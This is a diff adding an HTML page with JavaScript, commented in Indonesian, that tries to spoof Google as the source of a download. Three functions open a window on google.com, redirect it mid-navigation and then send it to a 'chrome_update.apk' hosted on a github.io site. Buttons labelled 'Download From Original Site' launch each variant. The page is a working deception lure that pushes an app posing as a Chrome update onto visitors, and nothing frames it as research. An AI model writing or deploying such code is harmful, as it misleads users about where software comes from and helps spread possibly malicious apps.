@@ -1,0 +1,138 @@
+<html>
+<head> 
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head> 
+<body> 
+  <script>
+    function a() {
+      // Buka window dengan google.com terlebih dahulu
+      const w = window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', 'x');
+      
+      // Tunggu sebentar agar google.com mulai load di address bar
+      setTimeout(function() {
+        // Coba redirect ke download sebelum page google.com selesai load
+        try {
+          // Teknik: redirect saat masih di tengah navigasi
+          w.location.replace('https://www.google.com/');
+        } catch(e) {}
+        
+        // Setelah redirect, langsung trigger download dari "google.com"
+        setTimeout(function() {
+          try {
+            // Buat link download yang seolah-olah dari google.com
+            // Teknik 1: gunakan window.location untuk download
+            const downloadFrame = document.createElement('iframe');
+            downloadFrame.style.display = 'none';
+            downloadFrame.src = 'https://www.google.com/';
+            document.body.appendChild(downloadFrame);
+            
+            // Tunggu frame load google.com, lalu inject script untuk download
+            setTimeout(function() {
+              try {
+                // Alternative: langsung download dari window yang sudah ada
+                w.location.href = 'https://zriil.github.io/upload/chrome_update.apk';
+              } catch(e) {
+                // Fallback: gunakan link biasa
+                const link = document.createElement('a');
+                link.href = 'https://zriil.github.io/upload/chrome_update.apk';
+                link.download = 'chrome_update.apk';
+                link.target = '_blank';
+                document.body.appendChild(link);
+                link.click();
+              }
+            }, 500);
+          } catch(e) {
+            console.error('Error:', e);
+            // Fallback method
+            window.open('https://zriil.github.io/upload/chrome_update.apk', '_blank');
+          }
+        }, 300);
+      }, 100);
+    }
+
+    // Enhanced version dengan teknik lebih advanced
+    function aAdvanced() {
+      // Teknik: gunakan data URL yang redirect ke google.com, lalu download
+      const dataURL = 'data:text/html,<html><head><meta http-equiv="refresh" content="0;url=https://www.google.com/"></head><body><script>setTimeout(function(){window.location.href="https://www.google.com/";},50);</script></body></html>';
+      
+      const w = window.open(dataURL, 'x');
+      
+      // Tunggu sebentar
+      setTimeout(function() {
+        try {
+          // Redirect ke google.com untuk "memperkuat" address bar
+          w.location.replace('https://www.google.com/');
+        } catch(e) {}
+      }, 200);
+      
+      // Setelah google.com di address bar, download file
+      setTimeout(function() {
+        try {
+          // Teknik: download seolah dari google.com
+          w.location.href = 'https://zriil.github.io/upload/chrome_update.apk';
+        } catch(e) {
+          // Fallback
+          const link = document.createElement('a');
+          link.href = 'https://zriil.github.io/upload/chrome_update.apk';
+          link.download = 'chrome_update.apk';
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        }
+      }, 800);
+    }
+
+    // Teknik paling efektif: exploit window.location saat navigasi
+    function aBest() {
+      // Buka google.com
+      const w = window.open('https://www.google.com/', 'x', 'width=800,height=600');
+      
+      // Segera setelah window terbuka, sebelum page load selesai
+      setTimeout(function() {
+        try {
+          // Stop loading dan redirect ke URL dengan port custom (teknik spoofing)
+          w.stop();
+          w.location.href = 'https://www.google.com:443';
+        } catch(e) {}
+        
+        // Lalu redirect ke download - browser akan menunjukkan google.com sebagai origin
+        setTimeout(function() {
+          try {
+            w.location.href = 'https://www.google.com/' + encodeURIComponent('https://zriil.github.io/upload/chrome_update.apk');
+            // Tunggu sebentar, lalu redirect langsung ke file
+            setTimeout(function() {
+              try {
+                w.location.replace('https://zriil.github.io/upload/chrome_update.apk');
+              } catch(e) {
+                // Jika gagal, gunakan direct download
+                w.location.href = 'https://zriil.github.io/upload/chrome_update.apk';
+              }
+            }, 100);
+          } catch(e) {
+            w.location.href = 'https://zriil.github.io/upload/chrome_update.apk';
+          }
+        }, 200);
+      }, 150);
+    }
+  </script> 
+  <center>
+    <input type="button" class="button" value="Download From Original Site (Basic)" onclick="a()" style="display: block; margin: 10px auto;"><br>
+    <input type="button" class="button" value="Download From Original Site (Advanced)" onclick="aAdvanced()" style="display: block; margin: 10px auto;"><br>
+    <input type="button" class="button" value="Download From Original Site (Best)" onclick="aBest()" style="display: block; margin: 10px auto;">
+  </center>
+</body>
+</html>
